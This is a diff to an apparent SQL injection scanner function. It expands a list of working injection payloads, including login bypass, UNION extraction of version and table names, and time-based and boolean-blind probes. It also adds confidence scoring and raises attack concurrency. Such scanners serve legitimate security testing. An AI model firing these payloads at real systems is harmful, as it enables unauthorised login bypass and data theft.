@@ -23,32 +23,34 @@ def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
     
     # Enhanced Payloads (Polyglots & Logic Tests)
     payloads = [
-        # 1. Auth Bypass (Advanced WAF Evasion)
         {"payload": "' OR '1'='1", "type": "auth_bypass"},
         {"payload": "' OR 1=1 --", "type": "auth_bypass"},
         {"payload": "'/**/OR/**/1=1/**/--", "type": "auth_bypass"},
         {"payload": "'%20OR%201=1%20--", "type": "auth_bypass"},
-        {"payload": "'%2BOR%2B1=1%2B--", "type": "auth_bypass"}, # + space
         {"payload": "' OR true --", "type": "auth_bypass"},
-        {"payload": "' OR '1'='1'/*", "type": "auth_bypass"},
-
-        # 2. UNION Based Extraction (Obfuscated)
+        {"payload": "admin' --", "type": "auth_bypass"},
+        {"payload": "admin' #", "type": "auth_bypass"},
+        {"payload": "admin'/*", "type": "auth_bypass"},
         {"payload": "' UNION SELECT 1, 'BP_VULN', 3--", "type": "union"},
         {"payload": "'/**/UNION/**/SELECT/**/NULL,@@version,NULL--", "type": "union_extraction"},
         {"payload": "' AND 0 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--", "type": "union_extraction"},
-        {"payload": "'%20UNION%20SELECT%20NULL,user(),NULL--", "type": "union_extraction"},
-        
-        # 3. Time-Based Blind (Polyglot)
         {"payload": "'; WAITFOR DELAY '0:0:5'--", "type": "time_based"}, 
         {"payload": "' OR SLEEP(5)--", "type": "time_based"},
-        {"payload": "' OR 1=1 AND SLEEP(5)--", "type": "time_based"},
         {"payload": "';SELECT PG_SLEEP(5)--", "type": "time_based"},
         {"payload": "') OR SLEEP(5) AND ('1'='1", "type": "time_based"},
-
-        # 4. Error Provocation / Logic Testing
         {"payload": "'", "type": "syntax_test"},
         {"payload": "';", "type": "syntax_test"},
-        {"payload": "' AND 1=CONVERT(int,@@version) --", "type": "error_based"}
+        {"payload": "' AND 1=CONVERT(int,@@version) --", "type": "error_based"},
+        {"payload": "1' ORDER BY 100--", "type": "error_based"},
+        {"payload": "1' AND 1=1 --", "type": "boolean_blind"},
+        {"payload": "1' AND 1=2 --", "type": "boolean_blind"},
+        {"payload": "' AND 'a'='a", "type": "boolean_blind"},
+        {"payload": "' AND 'a'='b", "type": "boolean_blind"},
+        {"payload": "admin' AND 1=1 --", "type": "auth_bypass"},
+        {"payload": "admin' AND 1=0 --", "type": "auth_bypass"},
+        {"payload": "limit 1,1 --", "type": "syntax_test"},
+        {"payload": "'-'", "type": "cve_blind"},
+        {"payload": "'||'1", "type": "auth_bypass"}
     ]
     
     # 5. DESTRUCTIVE / SCHEMA MODIFICATION (Aggressive Mode & Extra)
@@ -136,7 +138,18 @@ def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
         with lock:
             variants.append({"field": field, "payload": p, "status": resp.status_code})
             if suspicious:
-                issues_found.append(f"[CRITICAL] SQLi in '{field}': {', '.join(reasons)}")
+                # Determine Confidence Level for this specific finding
+                conf = "MEDIUM"
+                if ptype in ["union_extraction", "error_based", "rce_via_sqli"]:
+                    if any(sig in lower_text for sig in err_sigs): conf = "CONFIRMED" # Explicit Error
+                    elif "test_value" in lower_text or "hacked" in lower_text: conf = "CONFIRMED" # Explicit Echo
+                    else: conf = "HIGH"
+                elif ptype == "time_based":
+                    conf = "HIGH" # Strong timing signal
+                elif ptype == "auth_bypass":
+                    conf = "MEDIUM" # Heuristic (could be successful login or just same page)
+                
+                issues_found.append({"msg": f"[CRITICAL] SQLi in '{field}': {', '.join(reasons)}", "confidence": conf, "payload": p})
 
     # BUILD TASK LIST
     tasks = []
@@ -147,17 +160,35 @@ def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
     # EXECUTE PARALLEL (High Speed)
     # Using 15 threads max for SQLi to avoid flooding database connections too hard if local
     # But user asked for "FAST AS FUCK", so let's push it.
-    pool_size = 25 if scenario.config.get("aggressive") else 10
+    pool_size = 50 if scenario.config.get("aggressive") else 20
     
     with concurrent.futures.ThreadPoolExecutor(max_workers=pool_size) as executor:
         list(executor.map(check_sqli, tasks))
 
+    # Calculate Max Confidence
+    confidence_levels = {"CONFIRMED": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
+    max_conf = "LOW"
+    max_score = 0
+    top_payload = None
+    
+    final_issues = []
+    
+    for issue in issues_found:
+        final_issues.append(issue["msg"])
+        score = confidence_levels.get(issue["confidence"], 1)
+        if score > max_score:
+            max_score = score
+            max_conf = issue["confidence"]
+            top_payload = issue.get("payload")
+
     return {
         "scenario_id": scenario.id,
         "attack_type": "sql_injection",
-        "passed": len(issues_found) == 0,
+        "passed": len(final_issues) == 0,
+        "confidence": max_conf if final_issues else "LOW",
         "details": {
-            "issues": issues_found,
+            "issues": final_issues,
+            "reproduction_payload": top_payload,
             "leaked_data": list(set(leaked_data))
         }
     }
